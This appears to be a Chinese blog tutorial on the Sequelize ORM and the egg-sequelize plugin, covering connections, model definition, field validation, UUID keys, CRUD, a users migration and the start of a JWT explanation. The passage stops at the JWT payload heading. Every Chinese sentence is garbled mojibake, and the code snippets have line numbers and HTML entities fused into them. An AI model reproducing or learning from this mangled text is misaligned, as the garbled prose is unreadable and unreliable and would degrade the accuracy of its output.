æ–‡æ¡£ï¼šdocs.sequelizejs.com/ sequelize ä½¿ç”¨å®‰è£…ï¼š 12$ npm install --save sequelizeå¤åˆ¶ä»£ç  å»ºç«‹è¿æ¥ï¼š 1234567891011121314151617181920const Sequelize = require(&quot;sequelize&quot;);// å®Œæ•´ç”¨æ³•const sequelize = new Sequelize(&quot;database&quot;, &quot;username&quot;, &quot;password&quot;, &#123; host: &quot;localhost&quot;, dialect: &quot;mysql&quot; | &quot;sqlite&quot; | &quot;postgres&quot; | &quot;mssql&quot;, operatorsAliases: false, pool: &#123; max: 5, min: 0, acquire: 30000, idle: 10000 &#125;, // SQLite only storage: &quot;path/to/database.sqlite&quot;&#125;);// ç®€å•ç”¨æ³•const sequelize = new Sequelize(&quot;postgres://user:pass@example.com:5432/dbname&quot;);å¤åˆ¶ä»£ç  æ ¡éªŒè¿æ¥æ˜¯å¦æ­£ç¡®ï¼š 123456789sequelize .authenticate() .then(() =&gt; &#123; console.log(&quot;Connection has been established successfully.&quot;); &#125;) .catch(err =&gt; &#123; console.error(&quot;Unable to connect to the database:&quot;, err); &#125;);å¤åˆ¶ä»£ç  å®šä¹‰ Model ï¼š å®šä¹‰ä¸€ä¸ª Model çš„åŸºæœ¬è¯­æ³•ï¼š 12sequelize.define(&quot;name&quot;, &#123; attributes &#125;, &#123; options &#125;);å¤åˆ¶ä»£ç  ä¾‹å¦‚ï¼š 123456789const User = sequelize.define(&quot;user&quot;, &#123; username: &#123; type: Sequelize.STRING &#125;, password: &#123; type: Sequelize.STRING &#125;&#125;);å¤åˆ¶ä»£ç  å¯¹äºä¸€ä¸ª Model å­—æ®µç±»å‹è®¾è®¡ï¼Œä¸»è¦è€ƒè™‘ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š Sequelize é»˜è®¤ä¼šæ·»åŠ  createdAt å’Œ updatedAtï¼Œè¿™æ ·å¯ä»¥å¾ˆæ–¹ä¾¿çš„çŸ¥é“æ•°æ®åˆ›å»ºå’Œæ›´æ–°çš„æ—¶é—´ã€‚å¦‚æœä¸æƒ³ä½¿ç”¨å¯ä»¥é€šè¿‡è®¾ç½® attributes çš„ timestamps: falseï¼› Sequelize æ”¯æŒä¸°å¯Œçš„æ•°æ®ç±»å‹ï¼Œä¾‹å¦‚ï¼šSTRINGã€CHARã€TEXTã€INTEGERã€FLOATã€DOUBLEã€BOOLEANã€DATEã€UUID ã€JSON ç­‰å¤šç§ä¸åŒçš„æ•°æ®ç±»å‹ï¼Œå…·ä½“å¯ä»¥çœ‹æ–‡æ¡£ï¼šDataTypesã€‚ Getters &amp; setters æ”¯æŒï¼Œå½“æˆ‘ä»¬éœ€è¦å¯¹å­—æ®µè¿›è¡Œå¤„ç†çš„æ—¶å€™ååˆ†æœ‰ç”¨ï¼Œä¾‹å¦‚ï¼šå¯¹å­—æ®µå€¼å¤§å°å†™è½¬æ¢å¤„ç†ã€‚ 123456789101112131415161718const Employee = sequelize.define(&quot;employee&quot;, &#123; name: &#123; type: Sequelize.STRING, allowNull: false, get() &#123; const title = this.getDataValue(&quot;title&quot;); return this.getDataValue(&quot;name&quot;) + &quot; (&quot; + title + &quot;)&quot;; &#125; &#125;, title: &#123; type: Sequelize.STRING, allowNull: false, set(val) &#123; this.setDataValue(&quot;title&quot;, val.toUpperCase()); &#125; &#125;&#125;);å¤åˆ¶ä»£ç  å­—æ®µæ ¡éªŒæœ‰ä¸¤ç§ç±»å‹ï¼šéç©ºæ ¡éªŒåŠç±»å‹æ ¡éªŒï¼ŒSequelize ä¸­éç©ºæ ¡éªŒé€šè¿‡å­—æ®µçš„ allowNull å±æ€§åˆ¤å®šï¼Œç±»å‹æ ¡éªŒæ˜¯é€šè¿‡ validate è¿›è¡Œåˆ¤å®šï¼Œåº•å±‚æ˜¯é€šè¿‡ validator.js å®ç°çš„ã€‚å¦‚æœæ¨¡å‹çš„ç‰¹å®šå­—æ®µè®¾ç½®ä¸ºå…è®¸ nullï¼ˆallowNullï¼štrueï¼‰ï¼Œå¹¶ä¸”è¯¥å€¼å·²è®¾ç½®ä¸º nullï¼Œåˆ™ validate å±æ€§ä¸ç”Ÿæ•ˆã€‚ä¾‹å¦‚ï¼Œæœ‰ä¸€ä¸ªå­—ç¬¦ä¸²å­—æ®µï¼ŒallowNull è®¾ç½®ä¸º trueï¼Œvalidate éªŒè¯å…¶é•¿åº¦è‡³å°‘ä¸º 5 ä¸ªå­—ç¬¦ï¼Œä½†ä¹Ÿå…è®¸ä¸ºç©ºã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849const ValidateMe = sequelize.define(&quot;foo&quot;, &#123; foo: &#123; type: Sequelize.STRING, validate: &#123; is: [&quot;^[a-z]+$&quot;, &quot;i&quot;], // will only allow letters is: /^[a-z]+$/i, // same as the previous example using real RegExp not: [&quot;[a-z]&quot;, &quot;i&quot;], // will not allow letters isEmail: true, // checks for email format (foo@bar.com) isUrl: true, // checks for url format (http://foo.com) isIP: true, // checks for IPv4 (129.89.23.1) or IPv6 format isIPv4: true, // checks for IPv4 (129.89.23.1) isIPv6: true, // checks for IPv6 format isAlpha: true, // will only allow letters isAlphanumeric: true, // will only allow alphanumeric characters, so &quot;_abc&quot; will fail isNumeric: true, // will only allow numbers isInt: true, // checks for valid integers isFloat: true, // checks for valid floating point numbers isDecimal: true, // checks for any numbers isLowercase: true, // checks for lowercase isUppercase: true, // checks for uppercase notNull: true, // won&apos;t allow null isNull: true, // only allows null notEmpty: true, // don&apos;t allow empty strings equals: &quot;specific value&quot;, // only allow a specific value contains: &quot;foo&quot;, // force specific substrings notIn: [[&quot;foo&quot;, &quot;bar&quot;]], // check the value is not one of these isIn: [[&quot;foo&quot;, &quot;bar&quot;]], // check the value is one of these notContains: &quot;bar&quot;, // don&apos;t allow specific substrings len: [2, 10], // only allow values with length between 2 and 10 isUUID: 4, // only allow uuids isDate: true, // only allow date strings isAfter: &quot;2011-11-05&quot;, // only allow date strings after a specific date isBefore: &quot;2011-11-05&quot;, // only allow date strings before a specific date max: 23, // only allow values &lt;= 23 min: 23, // only allow values &gt;= 23 isCreditCard: true, // check for valid credit card numbers // custom validations are also possible: isEven(value) &#123; if (parseInt(value) % 2 != 0) &#123; throw new Error(&quot;Only even values are allowed!&quot;); // we also are in the model&apos;s context here, so this.otherField // would get the value of otherField if it existed &#125; &#125; &#125; &#125;&#125;);å¤åˆ¶ä»£ç  æœ€åæˆ‘ä»¬è¯´æ˜ä¸€ä¸ªæœ€é‡è¦çš„å­—æ®µä¸»é”® id çš„è®¾è®¡ï¼Œ éœ€è¦é€šè¿‡å­—æ®µ primaryKey: true æŒ‡å®šä¸ºä¸»é”®ã€‚MySQL é‡Œé¢ä¸»é”®è®¾è®¡ä¸»è¦æœ‰ä¸¤ç§æ–¹å¼ï¼šè‡ªåŠ¨é€’å¢ï¼›UUIDã€‚ è‡ªåŠ¨é€’å¢è®¾ç½® autoIncrement: true å³å¯ï¼Œå¯¹äºä¸€èˆ¬çš„å°å‹ç³»ç»Ÿè¿™ç§æ–¹å¼æ˜¯æœ€æ–¹ä¾¿ï¼ŒæŸ¥è¯¢æ•ˆç‡æœ€é«˜çš„ï¼Œä½†æ˜¯è¿™ç§ä¸åˆ©äºåˆ†å¸ƒå¼é›†ç¾¤éƒ¨ç½²ï¼Œè¿™ç§åŸºæœ¬ç”¨è¿‡ MySQL é‡Œé¢åº”ç”¨éƒ½ç”¨è¿‡ï¼Œè¿™é‡Œä¸åšæ·±å…¥è®¨è®ºã€‚ UUID, åˆåå…¨çƒç‹¬ç«‹æ ‡è¯†(Globally Unique Identifier)ï¼ŒUUID æ˜¯ 128 ä½(é•¿åº¦å›ºå®š)unsigned integer, èƒ½å¤Ÿä¿è¯åœ¨ç©ºé—´(Space)ä¸æ—¶é—´(Time)ä¸Šçš„å”¯ä¸€æ€§ã€‚è€Œä¸”æ— éœ€æ³¨å†Œæœºåˆ¶ä¿è¯, å¯ä»¥æŒ‰éœ€éšæ—¶ç”Ÿæˆã€‚æ® WIKI, éšæœºç®—æ³•ç”Ÿæˆçš„ UUID çš„é‡å¤æ¦‚ç‡ä¸º 170 äº¿åˆ†ä¹‹ä¸€ã€‚Sequelize æ•°æ®ç±»å‹ä¸­æœ‰ UUIDï¼ŒUUID1ï¼ŒUUID4 ä¸‰ç§ç±»å‹ï¼ŒåŸºäºnode-uuid éµå¾ª RFC4122ã€‚ä¾‹å¦‚ï¼š 123456789const User = sequelize.define(&quot;user&quot;, &#123; id: &#123; type: Sequelize.UUID, primaryKey: true, allowNull: false, defaultValue: Sequelize.UUID1 &#125;&#125;);å¤åˆ¶ä»£ç  è¿™æ · id é»˜è®¤å€¼ç”Ÿæˆä¸€ä¸ª uuid å­—ç¬¦ä¸²ï¼Œä¾‹å¦‚ï¼šâ€™1c572360-faca-11e7-83ee-9d836d45ff41â€™ï¼Œå¾ˆå¤šæ—¶å€™æˆ‘ä»¬ä¸å¤ªæƒ³è¦è¿™ä¸ª - å­—ç¬¦ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è®¾ç½® defaultValue å®ç°ï¼Œä¾‹å¦‚ï¼š 12345678910111213const uuidv1 = require(&quot;uuid/v1&quot;);const User = sequelize.define(&quot;user&quot;, &#123; id: &#123; type: Sequelize.UUID, primaryKey: true, allowNull: false, defaultValue: function() &#123; return uuidv1().replace(/-/g, &quot;&quot;); &#125; &#125;&#125;);å¤åˆ¶ä»£ç  ä½¿ç”¨ Model å¯¹è±¡ï¼š å¯¹äº Model å¯¹è±¡æ“ä½œï¼ŒSequelize æä¾›äº†ä¸€ç³»åˆ—çš„æ–¹æ³•ï¼š findï¼šæœç´¢æ•°æ®åº“ä¸­çš„ä¸€ä¸ªç‰¹å®šå…ƒç´ ï¼Œå¯ä»¥é€šè¿‡ findById æˆ– findOneï¼› findOrCreateï¼šæœç´¢ç‰¹å®šå…ƒç´ æˆ–åœ¨ä¸å¯ç”¨æ—¶åˆ›å»ºå®ƒï¼› findAndCountAllï¼šæœç´¢æ•°æ®åº“ä¸­çš„å¤šä¸ªå…ƒç´ ï¼Œè¿”å›æ•°æ®å’Œæ€»æ•°ï¼› findAllï¼šåœ¨æ•°æ®åº“ä¸­æœç´¢å¤šä¸ªå…ƒç´ ï¼› å¤æ‚çš„è¿‡æ»¤/ OR / NOT æŸ¥è¯¢ï¼› ä½¿ç”¨ limit(é™åˆ¶)ï¼Œoffset(åç§»é‡)ï¼Œorder(é¡ºåº)å’Œ group(ç»„)æ“ä½œæ•°æ®é›†; countï¼šè®¡ç®—æ•°æ®åº“ä¸­å…ƒç´ çš„å‡ºç°æ¬¡æ•°ï¼› maxï¼šè·å–ç‰¹å®šè¡¨æ ¼ä¸­ç‰¹å®šå±æ€§çš„æœ€å¤§å€¼ï¼› minï¼šè·å–ç‰¹å®šè¡¨æ ¼ä¸­ç‰¹å®šå±æ€§çš„æœ€å°å€¼ï¼› sumï¼šç‰¹å®šå±æ€§çš„å€¼æ±‚å’Œï¼› createï¼šåˆ›å»ºæ•°æ®åº“ Model å®ä¾‹ï¼› updateï¼šæ›´æ–°æ•°æ®åº“ Model å®ä¾‹ï¼› destroyï¼šé”€æ¯æ•°æ®åº“ Model å®ä¾‹ã€‚ é€šè¿‡ä¸Šè¿°æä¾›çš„ä¸€ç³»åˆ—æ–¹æ³•å¯ä»¥å®ç°æ•°æ®çš„å¢åˆ æ”¹æŸ¥ï¼ˆCRUDï¼‰ï¼Œä¾‹å¦‚ï¼š 12345678910111213141516171819202122232425262728User.create(&#123; username: &quot;fnord&quot;, job: &quot;omnomnom&quot; &#125;) .then(() =&gt; User.findOrCreate(&#123; where: &#123; username: &quot;fnord&quot; &#125;, defaults: &#123; job: &quot;something else&quot; &#125; &#125;) ) .spread((user, created) =&gt; &#123; console.log( user.get(&#123; plain: true &#125;) ); console.log(created); /* In this example, findOrCreate returns an array like this: [ &#123; username: &apos;fnord&apos;, job: &apos;omnomnom&apos;, id: 2, createdAt: Fri Mar 22 2013 21: 28: 34 GMT + 0100(CET), updatedAt: Fri Mar 22 2013 21: 28: 34 GMT + 0100(CET) &#125;, false ] */ &#125;);å¤åˆ¶ä»£ç  egg-sequelize æ’ä»¶æ–‡æ¡£ï¼šegg-sequelizeï¼šgithub.com/eggjs/egg-sâ€¦ æºç ç®€æè¿™é‡Œæˆ‘ä»¬æš‚æ—¶å…ˆä¸åˆ†æ egg æ’ä»¶è§„èŒƒï¼Œæš‚æ—¶å…ˆåªçœ‹çœ‹ egg-sequelize/lib/loader.js é‡Œé¢çš„å®ç°ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788&quot;use strict&quot;;const path = require(&quot;path&quot;);const Sequelize = require(&quot;sequelize&quot;);const MODELS = Symbol(&quot;loadedModels&quot;);const chalk = require(&quot;chalk&quot;);Sequelize.prototype.log = function() &#123; if (this.options.logging === false) &#123; return; &#125; const args = Array.prototype.slice.call(arguments); const sql = args[0].replace(/Executed \(.+?\):\s&#123;0,1&#125;/, &quot;&quot;); this.options.logging.info(&quot;[model]&quot;, chalk.magenta(sql), `($&#123;args[1]&#125;ms)`);&#125;;module.exports = app =&gt; &#123; const defaultConfig = &#123; logging: app.logger, host: &quot;localhost&quot;, port: 3306, username: &quot;root&quot;, benchmark: true, define: &#123; freezeTableName: false, underscored: true &#125; &#125;; const config = Object.assign(defaultConfig, app.config.sequelize); app.Sequelize = Sequelize; const sequelize = new Sequelize( config.database, config.username, config.password, config ); // app.sequelize Object.defineProperty(app, &quot;model&quot;, &#123; value: sequelize, writable: false, configurable: false &#125;); loadModel(app); app.beforeStart(function*() &#123; yield app.model.authenticate(); &#125;);&#125;;function loadModel(app) &#123; const modelDir = path.join(app.baseDir, &quot;app/model&quot;); app.loader.loadToApp(modelDir, MODELS, &#123; inject: app, caseStyle: &quot;upper&quot;, ignore: &quot;index.js&quot; &#125;); for (const name of Object.keys(app[MODELS])) &#123; const klass = app[MODELS][name]; // only this Sequelize Model class if (&quot;sequelize&quot; in klass) &#123; app.model[name] = klass; if ( &quot;classMethods&quot; in klass.options || &quot;instanceMethods&quot; in klass.options ) &#123; app.logger .error(`$&#123;name&#125; model has classMethods/instanceMethods, but it was removed supports in Sequelize V4.\see: http://docs.sequelizejs.com/manual/tutorial/models-definition.html#expansion-of-models`); &#125; &#125; &#125; for (const name of Object.keys(app[MODELS])) &#123; const klass = app[MODELS][name]; if (&quot;associate&quot; in klass) &#123; klass.associate(); &#125; &#125;&#125;å¤åˆ¶ä»£ç  å¾ˆæ˜æ˜¾åœ¨æ’ä»¶åˆå§‹åŒ–çš„æ—¶å€™è¿›è¡Œäº† Sequelize å¯¹è±¡çš„å®ä¾‹åŒ–ï¼Œå¹¶å°† Sequelize å¯¹è±¡æŒ‚è½½åœ¨ app å¯¹è±¡ä¸‹ï¼Œå³æˆ‘ä»¬å¯ä»¥é€šè¿‡ app.Sequelize è®¿é—® Sequelize å¯¹è±¡ï¼ŒåŒæ—¶æˆ‘ä»¬å¯ä»¥é€šè¿‡ app.model å¯¹ Sequelize å®ä¾‹åŒ–è¿›è¡Œè®¿é—®ï¼Œapp/model æ–‡ä»¶å¤¹ä¸‹å­˜æ”¾ model å¯¹è±¡æ–‡ä»¶ã€‚ ç”¨æˆ· Model è®¾è®¡è¿™é‡Œæˆ‘ä»¬ä»¥ egg-sequelize çš„ä½¿ç”¨ä¸ºä¾‹åŠ ä»¥è¯´æ˜ã€‚ å®‰è£…ï¼š 123$ npm i --save egg-sequelize$ npm install --save mysql2 # For both mysql and mariadb dialectså¤åˆ¶ä»£ç  é…ç½®ï¼š app/config/plugin.js é…ç½®ï¼š 12345exports.sequelize = &#123; enable: true, package: &quot;egg-sequelize&quot;&#125;;å¤åˆ¶ä»£ç  app/config/config.default.js é…ç½®ï¼š 12345678910111213141516// æ•°æ®åº“ä¿¡æ¯é…ç½®exports.sequelize = &#123; // æ•°æ®åº“ç±»å‹ dialect: &quot;mysql&quot;, // host host: &quot;localhost&quot;, // ç«¯å£å· port: &quot;3306&quot;, // ç”¨æˆ·å username: &quot;root&quot;, // å¯†ç  password: &quot;xxx&quot;, // æ•°æ®åº“å database: &quot;AEMM&quot;&#125;;å¤åˆ¶ä»£ç  Model å±‚ï¼š ç›´æ¥ä½¿ç”¨ Sequelize è™½ç„¶å¯ä»¥ï¼Œä½†æ˜¯å­˜åœ¨ä¸€äº›é—®é¢˜ã€‚å›¢é˜Ÿå¼€å‘æ—¶ï¼Œæœ‰äººå–œæ¬¢è‡ªå·±åŠ  timestampï¼Œæœ‰äººåˆå–œæ¬¢è‡ªå¢ä¸»é”®ï¼Œå¹¶ä¸”è‡ªå®šä¹‰è¡¨åã€‚ä¸€ä¸ªå¤§å‹ Web App é€šå¸¸éƒ½æœ‰å‡ åä¸ªæ˜ å°„è¡¨ï¼Œä¸€ä¸ªæ˜ å°„è¡¨å°±æ˜¯ä¸€ä¸ª Modelã€‚å¦‚æœæŒ‰ç…§å„è‡ªå–œå¥½ï¼Œé‚£ä¸šåŠ¡ä»£ç å°±ä¸å¥½å†™ã€‚Model ä¸ç»Ÿä¸€ï¼Œå¾ˆå¤šä»£ç ä¹Ÿæ— æ³•å¤ç”¨ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€ä¸ªç»Ÿä¸€çš„æ¨¡å‹ï¼Œå¼ºè¿«æ‰€æœ‰ Model éƒ½éµå®ˆåŒä¸€ä¸ªè§„èŒƒï¼Œè¿™æ ·ä¸ä½†å®ç°ç®€å•ï¼Œè€Œä¸”å®¹æ˜“ç»Ÿä¸€é£æ ¼ã€‚ æˆ‘ä»¬é¦–å…ˆè¦å®šä¹‰çš„å°±æ˜¯ Model å­˜æ”¾çš„æ–‡ä»¶å¤¹å¿…é¡»åœ¨ models å†…ï¼Œå¹¶ä¸”ä»¥ Model åå­—å‘½åï¼Œä¾‹å¦‚ï¼šPet.jsï¼ŒUser.js ç­‰ç­‰ã€‚å…¶æ¬¡ï¼Œæ¯ä¸ª Model å¿…é¡»éµå®ˆä¸€å¥—è§„èŒƒï¼š ç»Ÿä¸€ä¸»é”®ï¼Œåç§°å¿…é¡»æ˜¯ idï¼Œç±»å‹å¿…é¡»æ˜¯ UUIDï¼› æ‰€æœ‰å­—æ®µé»˜è®¤ä¸º NULLï¼Œé™¤éæ˜¾å¼æŒ‡å®šï¼› ç»Ÿä¸€ timestamp æœºåˆ¶ï¼Œæ¯ä¸ª Model å¿…é¡»æœ‰ createdAtã€updatedAt å’Œ versionï¼Œåˆ†åˆ«è®°å½•åˆ›å»ºæ—¶é—´ã€ä¿®æ”¹æ—¶é—´å’Œç‰ˆæœ¬å·ã€‚ æ‰€ä»¥ï¼Œæˆ‘ä»¬ä¸è¦ç›´æ¥ä½¿ç”¨ Sequelize çš„ APIï¼Œè€Œæ˜¯é€šè¿‡ db.js é—´æ¥åœ°å®šä¹‰ Modelã€‚ä¾‹å¦‚ï¼ŒUser.js åº”è¯¥å®šä¹‰å¦‚ä¸‹ï¼š app/db.jsï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041const uuidv1 = require(&quot;uuid/v1&quot;);function generateUUID() &#123; return uuidv1().replace(/-/g, &quot;&quot;);&#125;function defineModel(app, name, attributes) &#123; const &#123; UUID &#125; = app.Sequelize; let attrs = &#123;&#125;; for (let key in attributes) &#123; let value = attributes[key]; if (typeof value === &quot;object&quot; &amp;&amp; value[&quot;type&quot;]) &#123; value.allowNull = value.allowNull &amp;&amp; true; attrs[key] = value; &#125; else &#123; attrs[key] = &#123; type: value, allowNull: true &#125;; &#125; &#125; attrs.id = &#123; type: UUID, primaryKey: true, defaultValue: () =&gt; &#123; return generateUUID(); &#125; &#125;; return app.model.define(name, attrs, &#123; createdAt: &quot;createdAt&quot;, updatedAt: &quot;updatedAt&quot;, version: true, freezeTableName: true &#125;);&#125;module.exports = &#123; defineModel &#125;;å¤åˆ¶ä»£ç  æˆ‘ä»¬å®šä¹‰çš„ defineModel å°±æ˜¯ä¸ºäº†å¼ºåˆ¶å®ç°ä¸Šè¿°è§„åˆ™ã€‚ app/model/User.jsï¼š 123456789101112131415161718192021222324252627const db = require(&quot;../db&quot;);module.exports = app =&gt; &#123; const &#123; STRING, INTEGER, DATE, BOOLEAN &#125; = app.Sequelize; const User = db.defineModel(app, &quot;users&quot;, &#123; username: &#123; type: STRING, unique: true, allowNull: false &#125;, // ç”¨æˆ·å email: &#123; type: STRING, unique: true, allowNull: false &#125;, // é‚®ç®± password: &#123; type: STRING, allowNull: false &#125;, // å¯†ç  name: STRING, // å§“å sex: INTEGER, // ç”¨æˆ·æ€§åˆ«ï¼š1ç”·æ€§, 2å¥³æ€§, 0æœªçŸ¥ age: INTEGER, // å¹´é¾„ avatar: STRING, // å¤´åƒ company: STRING, // å…¬å¸ department: STRING, // éƒ¨é—¨ telePhone: STRING, // è”ç³»ç”µè¯ mobilePhone: STRING, // æ‰‹æœºå·ç  info: STRING, // å¤‡æ³¨è¯´æ˜ roleId: STRING, // è§’è‰²id status: STRING, // ç”¨æˆ·çŠ¶æ€ token: STRING, // è®¤è¯ token lastSignInAt: DATE // ä¸Šæ¬¡ç™»å½•æ—¶é—´ &#125;); return User;&#125;;å¤åˆ¶ä»£ç  åœ¨æ•°æ®åº“æ“ä½œè®¾è®¡ä¸­ï¼Œæˆ‘ä»¬ä¸€èˆ¬æ˜¯é€šè¿‡è„šæœ¬æå‰ç”Ÿæˆè¡¨ç»“æ„ï¼Œå¦‚æœæ‰‹åŠ¨å†™åˆ›å»ºè¡¨çš„ SQLï¼Œæ¯æ¬¡ä¿®æ”¹è¡¨ç»“æ„å…¶å®æ˜¯ä¸€ä»¶éº»çƒ¦äº‹ã€‚Sequelize æä¾›äº†Migrations å¸®åŠ©åˆ›å»ºæˆ–è¿ç§»æ•°æ®åº“ï¼Œegg-sequelize é‡Œé¢ä¹Ÿæä¾›äº†æ–¹ä¾¿çš„æ–¹æ³•ã€‚å¦‚æœæ˜¯å¼€å‘é˜¶æ®µï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„æ–¹æ³•è‡ªåŠ¨æ‰§è¡Œï¼š 123456789// &#123;app_root&#125;/app.jsmodule.exports = app =&gt; &#123; if (app.config.env === &quot;local&quot;) &#123; app.beforeStart(function*() &#123; yield app.model.sync(&#123; force: true &#125;); &#125;); &#125;&#125;;å¤åˆ¶ä»£ç  å½“ç„¶ä¹Ÿå¯ä»¥åœ¨ package.json é‡Œé¢æ·»åŠ ä¸‹é¢çš„è„šæœ¬ï¼š å‘½ä»¤ è¯´æ˜ npm run migrate:new åœ¨ ./migrations/ ä¸­åˆ›å»ºä¸€ä¸ª è¿ç§»æ–‡ä»¶ to npm run migrate:up æ‰§è¡Œè¿ç§» npm run migrate:down å›æ»šä¸€æ¬¡è¿ç§» package.jsonï¼š 12345678...&quot;scripts&quot;: &#123; &quot;migrate:new&quot;: &quot;egg-sequelize migration:create --name init&quot;, &quot;migrate:up&quot;: &quot;egg-sequelize db:migrate&quot;, &quot;migrate:down&quot;: &quot;egg-sequelize db:migrate:undo&quot;&#125;...å¤åˆ¶ä»£ç  æ‰§è¡Œ npm run migrate:new åä¿®æ”¹ migrations æ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849module.exports = &#123; async up(queryInterface, Sequelize) &#123; const &#123; UUID, STRING, INTEGER, DATE, BOOLEAN &#125; = Sequelize; await queryInterface.createTable(&quot;users&quot;, &#123; id: &#123; type: UUID, primaryKey: true, allowNull: false &#125;, // ç”¨æˆ· IDï¼ˆä¸»é”®ï¼‰ username: &#123; type: STRING, unique: true, allowNull: false &#125;, // ç”¨æˆ·å email: &#123; type: STRING, unique: true, allowNull: false &#125;, // é‚®ç®± password: &#123; type: STRING, allowNull: false &#125;, // ç™»å½•å¯†ç  name: STRING, // å§“å age: INTEGER, // ç”¨æˆ·å¹´é¾„ info: STRING, // å¤‡æ³¨è¯´æ˜ sex: INTEGER, // ç”¨æˆ·æ€§åˆ«ï¼š1ç”·æ€§, 2å¥³æ€§, 0æœªçŸ¥ telePhone: STRING, // è”ç³»ç”µè¯ mobilePhone: STRING, // æ‰‹æœºå·ç  roleId: STRING, // è§’è‰²ID location: STRING, // å¸¸ä½åœ° avatar: STRING, // å¤´åƒ company: STRING, // å…¬å¸ department: STRING, // éƒ¨é—¨ emailVerified: BOOLEAN, // é‚®ç®±éªŒè¯ token: STRING, // èº«ä»½è®¤è¯ä»¤ç‰Œ status: &#123; type: INTEGER, allowNull: false &#125;, // ç”¨æˆ·çŠ¶æ€ï¼š1å¯ç”¨, 0ç¦ç”¨, 2éšè—, 3åˆ é™¤ createdAt: DATE, // ç”¨æˆ·åˆ›å»ºæ—¶é—´ updatedAt: DATE, // ç”¨æˆ·ä¿¡æ¯æ›´æ–°æ—¶é—´ lastSignInAt: DATE // ä¸Šæ¬¡ç™»å½•æ—¶é—´ &#125;); &#125;, async down(queryInterface, Sequelize) &#123; await queryInterface.dropTable(&quot;users&quot;); &#125;&#125;;å¤åˆ¶ä»£ç  ç”¨æˆ·è®¤è¯é€‰å‹æ‰€è°“ç”¨æˆ·è®¤è¯ï¼ˆAuthenticationï¼‰ï¼Œå°±æ˜¯è®©ç”¨æˆ·ç™»å½•ï¼Œå¹¶ä¸”åœ¨æ¥ä¸‹æ¥çš„ä¸€æ®µæ—¶é—´å†…è®©ç”¨æˆ·è®¿é—®ç½‘ç«™æ—¶å¯ä»¥ä½¿ç”¨å…¶è´¦æˆ·ï¼Œè€Œä¸éœ€è¦å†æ¬¡ç™»å½•çš„æœºåˆ¶ã€‚ å°çŸ¥è¯†ï¼šå¯åˆ«æŠŠç”¨æˆ·è®¤è¯å’Œç”¨æˆ·æˆæƒï¼ˆAuthorizationï¼‰ææ··äº†ã€‚ç”¨æˆ·æˆæƒæŒ‡çš„æ˜¯è§„å®šå¹¶å…è®¸ç”¨æˆ·ä½¿ç”¨è‡ªå·±çš„æƒé™ï¼Œä¾‹å¦‚å‘å¸ƒå¸–å­ã€ç®¡ç†ç«™ç‚¹ç­‰ã€‚ ç”¨æˆ·è®¤è¯ä¸»è¦åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ï¼š ç”¨æˆ·é€šè¿‡ç”¨æˆ·åå’Œå¯†ç ç™»å½•ç”Ÿæˆå¹¶ä¸”è·å– Tokenï¼› ç”¨æˆ·é€šè¿‡ Token éªŒè¯ç”¨æˆ·èº«ä»½è·å–ç›¸å…³ä¿¡æ¯ã€‚ JSON Web Tokenï¼ˆJWTï¼‰è§„èŒƒJSON Web Tokenï¼ˆJWTï¼‰æ˜¯ä¸€ä¸ªéå¸¸è½»å·§çš„è§„èŒƒã€‚è¿™ä¸ªè§„èŒƒå…è®¸æˆ‘ä»¬ä½¿ç”¨ JWT åœ¨ç”¨æˆ·å’ŒæœåŠ¡å™¨ä¹‹é—´ä¼ é€’å®‰å…¨å¯é çš„ä¿¡æ¯ã€‚ JWT çš„ç»„æˆä¸€ä¸ª JWT å®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå®ƒç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼Œå¤´éƒ¨ã€è½½è·ä¸ç­¾åã€‚ å¤´éƒ¨ï¼ˆHeaderï¼‰ JWT éœ€è¦ä¸€ä¸ªå¤´éƒ¨ï¼Œå¤´éƒ¨ç”¨äºæè¿°å…³äºè¯¥ JWT çš„æœ€åŸºæœ¬çš„ä¿¡æ¯ï¼Œä¾‹å¦‚å…¶ç±»å‹ä»¥åŠç­¾åæ‰€ç”¨çš„ç®—æ³•ç­‰ã€‚è¿™ä¹Ÿå¯ä»¥è¢«è¡¨ç¤ºæˆä¸€ä¸ª JSON å¯¹è±¡ã€‚ 12345&#123; &quot;typ&quot;: &quot;JWT&quot;, &quot;alg&quot;: &quot;HS256&quot;&#125;å¤åˆ¶ä»£ç  åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬è¯´æ˜äº†è¿™æ˜¯ä¸€ä¸ª JWTï¼Œå¹¶ä¸”æˆ‘ä»¬æ‰€ç”¨çš„ç­¾åç®—æ³•æ˜¯ HS256 ç®—æ³•ã€‚å¯¹å®ƒä¹Ÿè¦è¿›è¡Œ Base64 ç¼–ç ï¼Œä¹‹åçš„å­—ç¬¦ä¸²å°±æˆäº† JWT çš„ Headerï¼ˆå¤´éƒ¨ï¼‰ã€‚ 12eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9å¤åˆ¶ä»£ç  è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ base64url æ¨¡å—è¿›è¡Œ Base64 ç¼–ç æ¥å¾—åˆ°è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œæµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š 12345678910const base64url = require(&quot;base64url&quot;);let header = &#123; typ: &quot;JWT&quot;, alg: &quot;HS256&quot;&#125;;console.log(&quot;header: &quot; + base64url(JSON.stringify(header)));// header: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9å¤åˆ¶ä»£ç  å°çŸ¥è¯†ï¼šBase64 æ˜¯ä¸€ç§ç¼–ç ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå®ƒæ˜¯å¯ä»¥è¢«ç¿»è¯‘å›åŸæ¥çš„æ ·å­æ¥çš„ã€‚å®ƒå¹¶ä¸æ˜¯ä¸€ç§åŠ å¯†è¿‡ç¨‹ã€‚ è½½è·ï¼ˆPayloadï¼‰ 